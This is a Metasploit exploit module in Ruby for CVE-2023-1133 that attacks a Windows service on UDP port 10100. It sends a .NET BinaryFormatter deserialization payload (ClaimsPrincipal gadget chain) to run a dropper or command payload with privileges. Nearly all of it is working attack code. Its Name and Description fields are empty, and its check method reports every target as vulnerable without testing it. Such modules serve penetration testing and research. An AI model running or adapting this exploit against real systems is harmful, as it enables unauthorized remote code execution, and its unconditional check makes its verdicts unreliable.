# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::Udp
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => '',
        'Description' => %q{
        },
        'Author' => [
          'Anonymous', # Vulnerability discovery
          'Shelby Pace' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-1133'],
          ['URL', 'https://www.zerodayinitiative.com/advisories/ZDI-23-672/']
        ],
        'Platform' => 'win',
        'Targets' => [
          [
            'Windows EXE Dropper',
            {
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :windows_dropper,
              'DefaultOptions' => { 'PrependMigrate' => true }
            }
          ],
          [
            'Windows CMD',
            {
              'Arch' => [ARCH_CMD],
              'Type' => :windows_cmd
            }
          ],
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2023-05-17',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' => [REPEATABLE_SESSION]
        },
        'Privileged' => true
      )
    )

    register_options([ Opt::RPORT(10100) ])
  end

  def check
    CheckCode::Vulnerable
  end

  def exploit
    connect_udp
    serialized = ::Msf::Util::DotNetDeserialization.generate(
      payload.encoded,
      gadget_chain: :ClaimsPrincipal,
      formatter: :BinaryFormatter
    )

    pkt = "\x01#{[ serialized.length ].pack('n')}#{serialized}"
    udp_sock.put(pkt)
  end
end
